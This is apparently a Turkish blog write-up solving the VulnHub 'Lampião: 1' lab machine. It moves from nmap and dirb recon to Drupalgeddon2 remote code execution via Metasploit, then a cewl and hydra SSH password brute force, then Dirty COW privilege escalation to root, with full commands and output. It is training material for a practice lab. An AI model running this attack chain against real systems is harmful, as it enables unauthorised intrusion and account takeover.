# VULNHUB Lampião: 1 WRITEUP

Merhabalar. Bu yazımda [vulnhub](https://www.vulnhub.com/) sitesinde yer alan [Lampião: 1](https://www.vulnhub.com/entry/lampiao-1,249/) çözeceğiz.

Eğer metasploit, exploit, meterpreter, hydra hakkında bir fikriniz yoksa önce yazıyı anlamak için bu kavramları araştırmanızı tavsiye ederim.

Makineyi indirdikten sonra virtualbox ile açabiliriz. Ardından network adapter'ı kendinize uygun olarak ayarlamanız gerekiyor. Benim bilgisayarda kali kurulu olduğu için bridge olarak ayarladım. Eğer siz kali yada parrot'u sanal mikinede kullanıyorsanız NAT olarak ayarlayabilirsiniz. Neyse çok uzatmadan başlayalım.

## IP Adresinin Tespiti

Kali ve Parrot da kurulu olarak gelen `nediscover` aracı ile ağdaki cihazları tespit edebilirsiniz.

```
┌─[✗]─[hatsat@HATSAT]─[~]
└──╼ $sudo netdiscover
 172.16.0.177    08:00:27:3e:b2:97      2      84  PCS Systemtechnik GmbH 
```

Benim bağlı olduğum ağda çok fazla cihaz olduğu ve güvenlik gerekçesi ile diğer cihazların kayıtlarını sildim. Çıktı yukarıdakine benzer bi şey olacak. Mac adresi farklı olabilir, sorun yok. Artık IP adresini bildiğimize göre sıradaki aşamaya geçebiliriz.

## Nmap Taraması

Namp yada zenmap kullanarak tarama yapalım.

```
┌─[✗]─[hatsat@HATSAT]─[~]
└──╼ $sudo nmap -sS -sV -A -p- 172.16.0.177
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-11 19:30 +03
Nmap scan report for 172.16.0.177
Host is up (0.00073s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)
|   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)
|   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)
|_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)
80/tcp   open  http?
| fingerprint-strings: 
|   NULL: 
|     _____ _ _ 
|     |_|/ ___ ___ __ _ ___ _ _ 
|     \x20| __/ (_| __ \x20|_| |_ 
|     ___/ __| |___/ ___|__,_|___/__, ( ) 
|     |___/ 
|     ______ _ _ _ 
|     ___(_) | | | |
|     \x20/ _` | / _ / _` | | | |/ _` | |
|_    __,_|__,_|_| |_|
1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Lampi\xC3\xA3o
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.70%I=7%D=11/11%Time=5BE8593C%P=x86_64-pc-linux-gnu%r(NUL
SF:L,1179,"\x20_____\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\|_\x20\x20\x20_\|\x20\|\x20\(\
SF:x20\)\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\n\x20\x20\|\x20\|\x20\|\x20\|_\|/\x20___\x20\x20\x20\x20___\x20\x2
SF:0__\x20_\x20___\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:n\x20\x20\|\x20\|\x20\|\x20__\|\x20/\x20__\|\x20\x20/\x20_\x20\\/\x20_`
SF:\x20/\x20__\|\x20\|\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20_
SF:\|\x20\|_\|\x20\|_\x20\x20\\__\x20\\\x20\|\x20\x20__/\x20\(_\|\x20\\__\
SF:x20\\\x20\|_\|\x20\|_\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\\___/\x20\\__\
SF:|\x20\|___/\x20\x20\\___\|\\__,_\|___/\\__,\x20\(\x20\)\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20__/\x20\|/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|___/\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\n______\x20_\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\n\|\x20\x20___\(_\)\x20\x20\
SF:x20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\|\n
SF:\|\x20\|_\x20\x20\x20_\x20\x20\x20\x20__\|\x20\|_\x20\x20\x20_\x20_\x20
SF:__\x20___\x20\x20\x20__\x20_\x20\x20\x20\x20___\x20\x20__\x20_\x20_\x20
SF:\x20\x20_\x20\x20__\x20_\|\x20\|\n\|\x20\x20_\|\x20\|\x20\|\x20\x20/\x2
SF:0_`\x20\|\x20\|\x20\|\x20\|\x20'_\x20`\x20_\x20\\\x20/\x20_`\x20\|\x20\
SF:x20/\x20_\x20\\/\x20_`\x20\|\x20\|\x20\|\x20\|/\x20_`\x20\|\x20\|\n\|\x
SF:20\|\x20\x20\x20\|\x20\|\x20\|\x20\(_\|\x20\|\x20\|_\|\x20\|\x20\|\x20\
SF:|\x20\|\x20\|\x20\|\x20\(_\|\x20\|\x20\|\x20\x20__/\x20\(_\|\x20\|\x20\
SF:|_\|\x20\|\x20\(_\|\x20\|_\|\n\\_\|\x20\x20\x20\|_\|\x20\x20\\__,_\|\\_
SF:_,_\|_\|\x20\|_\|");
MAC Address: 08:00:27:3E:B2:97 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.73 ms 172.16.0.177

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.52 seconds
```

taramanın çıktısı buna benzer bi şey olması gerekiyor. Parametreler ise:
* `-sS` service scan
* `-sV` version scan
* `-p-` tür portları tara
* `-A` script, OS, version detection, traceroute taramalarının kısaltılmış yazımı


Çıktıyı incelediğimizde üç tane port açık olduğunu görüyoruz.
* `22` ssh
* `80` http
* `1898` http

Artık portları ve hizmetleri de biliyoruz.

## http Server Üzerinde Gezinti

80 ve 1898 portlarına sırayla bağlanarak sitede dolaşalım. Bakalım ne çıkacak.

80 portundan açtığımızda basit bi web sayfasından başka bi şey çıkmıyor. `dirb` ile tarama yaptığımdada bi şey çıkmadı ve hata verdi. O zaman diğer porta geçelim.

```
┌─[✗]─[hatsat@HATSAT]─[~]
└──╼ $dirb http://172.16.0.177/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Nov 11 19:40:48 2018
URL_BASE: http://172.16.0.177/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://172.16.0.177/ ----
                                                                               
(!) FATAL: Too many errors connecting to host
    (Possible cause: OK)
                                                                               
-----------------
END_TIME: Sun Nov 11 19:40:52 2018
DOWNLOADED: 0 - FOUND: 0
```


1898 portundan girdiğimizde ise bir web sayfası karşımıza çıkıyor. Drupal ile yapılmış. Siteyi sayfa sayfa dolaşıp kaynak kodu inceledikten sonra bi şey bulamadım (Eğer bulan arkadaş olduysa yorumda belirtirlerse sevinirim). `dirb` ile taradıktan ve sonuçlardan bi kaç dizini dolaştıktan sonra buradan bi şey çıkmayacağını anladım ve yöntem değiştirmeye karar verdim. `dirb` taramasının sonucu aşağıda.

```
┌─[✗]─[hatsat@HATSAT]─[~]
└──╼ $dirb http://172.16.0.177:1898/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Nov 11 19:45:37 2018
URL_BASE: http://172.16.0.177:1898/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://172.16.0.177:1898/ ----
==> DIRECTORY: http://172.16.0.177:1898/includes/                                           
+ http://172.16.0.177:1898/index.php (CODE:200|SIZE:11400)                                  
==> DIRECTORY: http://172.16.0.177:1898/misc/                                               
==> DIRECTORY: http://172.16.0.177:1898/modules/                                            
==> DIRECTORY: http://172.16.0.177:1898/profiles/                                           
+ http://172.16.0.177:1898/robots.txt (CODE:200|SIZE:2189)                                  
==> DIRECTORY: http://172.16.0.177:1898/scripts/                                            
+ http://172.16.0.177:1898/server-status (CODE:403|SIZE:294)                                
==> DIRECTORY: http://172.16.0.177:1898/sites/                                              
==> DIRECTORY: http://172.16.0.177:1898/themes/                                             
+ http://172.16.0.177:1898/web.config (CODE:200|SIZE:2200)                                  
+ http://172.16.0.177:1898/xmlrpc.php (CODE:200|SIZE:42)                                    
                                                                                            
---- Entering directory: http://172.16.0.177:1898/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                            
---- Entering directory: http://172.16.0.177:1898/misc/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                            
---- Entering directory: http://172.16.0.177:1898/modules/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                            
---- Entering directory: http://172.16.0.177:1898/profiles/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                            
---- Entering directory: http://172.16.0.177:1898/scripts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                            
---- Entering directory: http://172.16.0.177:1898/sites/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                            
---- Entering directory: http://172.16.0.177:1898/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sun Nov 11 19:45:39 2018
DOWNLOADED: 4612 - FOUND: 5
```

---

## Exploit Denemesi

İnterneten araştırma yaparken drupal için exploit ile ilgili bi yazı gördüm. Bende metasploit üzerinde bi arama yaparak drupal için exploit buldum.

```
┌─[root@HATSAT]─[/home/hatsat]
└──╼ #msfconsole 
                                                  

                 _---------.
             .' #######   ;."
  .---,.    ;@             @@`;   .---,..
." @@@@@'.,'@@            @@@@@',.'@@@@ ".
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
     "--'.@@@  -.@        @ ,'-   .'--"
          ".@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
             ' @@@ @@   @@    ,
              `.@@@@    @@   .
                ',@@     @   ;           _____________
                 (   3 C    )     /|___ / Metasploit! \
                 ;@'. __*__,."    \|--- \_____________/
                  '(.,...."/


       =[ metasploit v4.17.24-dev                         ]
+ -- --=[ 1825 exploits - 1033 auxiliary - 318 post       ]
+ -- --=[ 541 payloads - 44 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > search drupal

Matching Modules
================

   Name                                           Disclosure Date  Rank       Check  Description
   ----                                           ---------------  ----       -----  -----------
   auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
   exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
   exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
   exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
```

`   exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution` isimli exploiti kullanarak sisteme girebiliriz.

`use` komutu ile exploiti seçelim. Ardından `set` komutu ile `RHOST` ve `RPORT` parameterlerine gerekli değerleri atayalım. Burada IP adresi sizde farıklı olabilir. Sizdeki IP adresini girmelisiniz. Ardından `exploit` diyerek exploiti çalıştırabiliriz.

```
use exploit/unix/webapp/drupal_drupalgeddon2
show options
set RHOST 172.16.0.177
set RPORT 1898
exploit
```

Ardından `meterpreter` açılacak. Yardım için `help` komutunu girebilirsiniz. Ben `shell` komutu ile shell aldım. Biraz dizinlerde dolaştıktan bazı dosyaları inceledikten sonra `/etc/passwd` dosyasına baktım. Çıktı şu şekilde olacak:
```
cat /etc/passwd
tiago:x:1000:1000:tiago,,,:/home/tiago:/bin/bash
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:106:MySQL Server,,,:/nonexistent
```

Dosyayı incelediğimizde `tiago` kullanıcısını görüyoruz. uid si ise 1000. Bu kullanıcı ile ssh üzerinden sisteme giriş yapabiliriz. Peki ya parolası???

## Cewl ve Hytra Kullancı Parolası Kırma

Onlarca başarısız deneme ve bolca uğraşdan sonra sonunda cevabı buldum. `cewl` aracı. Bu araç web sayfası üzerinden wordlist oluşturmaya yarıyor. O zaman `cewl` ile worlist oluşturalım :)

```
cewl -d 3 -m 5 http://172.16.0.177:1898/ -w cewl_pass_tiago.txt
```

Parametreler şu şekilde:
* `-d` derinlik demek. Yani web sitesinde ne kadar derine gidecek.
* `-m` minimum uzunluk demek. En kısa parola uzunluğu.
* `-w` çıktının kaydedileceği dosya.

Bu dosyayı kullanaraş bruteforce yöntemi ile şifreyi kırmayı deneyebiliriz. Şansımız yaver giderse ...


Sıra geldi `hydra` ile ssh şifresi kırmaya. `hydra` gelişmiş bi şifre kırma aracıdır. Kali ve parrot da kurulu olarak gelir. Programı şu şekilde kullanabiliriz.

```
┌─[✗]─[root@HATSAT]─[/home/hatsat/TMP]
└──╼ #hydra 172.16.0.177 ssh -l tiago -P cewl_pass_tiago.txt 
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-11-11 17:59:10
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 603 login tries (l:1/p:603), ~38 tries per task
[DATA] attacking ssh://172.16.0.177:22/
[22][ssh] host: 172.16.0.177   login: tiago   password: Virgulino
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2018-11-11 17:59:28
```

Parametreler:
* `ssh` kullanılan protokol.
* `-l` kullanıcının ismi. Bu örnekte `tiago`
* `-P` wordlist. cewl ile oluşturduğumuz wordlist.

Bu komut ile parolayı bulduk. Parola: `Virgulino`

## SSH Login ve Sonrası

Bu bilgiler ile SSH ile sisteme login olabiliriz. `ssh tiago@172.16.0.177` komutu ile. Şu anda sistemdeyiz fakat henüz root değiliz.

```
┌─[hatsat@HATSAT]─[~]
└──╼ $ssh tiago@172.16.0.177
tiago@172.16.0.177's password: 
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sun Nov 11 18:15:51 BRST 2018

  System load:  0.07              Processes:           174
  Usage of /:   7.5% of 19.07GB   Users logged in:     0
  Memory usage: 27%               IP address for eth0: 172.16.0.177
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

New release '16.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Sun Nov 11 18:15:51 2018 from 172.16.0.106
tiago@lampiao:~$ 
```

Birkaç başarısız deneme ve araştırmadan sonra tekrar exploit arayışına girdim. Sistemin kernel sürümüne uygun bi exploit buldum. Kernel sürümünü şu şekilde öğrenebilirsiniz.

```
tiago@lampiao:~$ uname -a
Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
```

`4.4.0-31-generic` kernel sürümü için exploit ararken [buradaki](https://www.exploit-db.com/exploits/40847/) exploiti buldum. Ardından `scp` komutu ile bu exploiti sunucuya yükleyip çalıştırabiliriz.

```
┌─[✗]─[hatsat@HATSAT]─[~/Downloads]
└──╼ $scp 40847.cpp  tiago@172.16.0.177:~
tiago@172.16.0.177's password: 
40847.cpp                                                  100%   10KB  14.8MB/s   00:00
```

Şimdi derleyip çalıştıralım.

```
tiago@lampiao:~$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
tiago@lampiao:~$ ./dcow 
Running ...
Received su prompt (Password: )
Root password is:   dirtyCowFun
Enjoy! :-)
```

Ve artık root parolası elimizde. Parola: `dirtyCowFun`

```
tiago@lampiao:~$ su
Password: 
root@lampiao:/home/tiago# 
```

Şimdi root dizinindeki flag dosyasını okuyabiliriz.

```
root@lampiao:~# cat /root/flag.txt 
9740616875908d91ddcdaa8aea3af366
```

Bu makine boyunca araştırdığım konular şu şekilde.
* metasploit
* meterpreter
* hydra
* cewl
* scp

Bu vulnbubdan [vulnhub](https://www.vulnhub.com) dan çözdüğüm ilk makine idi. Beni oldukça yordu fakat devam edeceğim.

Umarım bu yazı size faydalı olmuştur. Eğer bi hatam varsa bana bildirmekten yorum atmaktan çekinmeyin. Şimdiden teşekkürler. Başarılar....
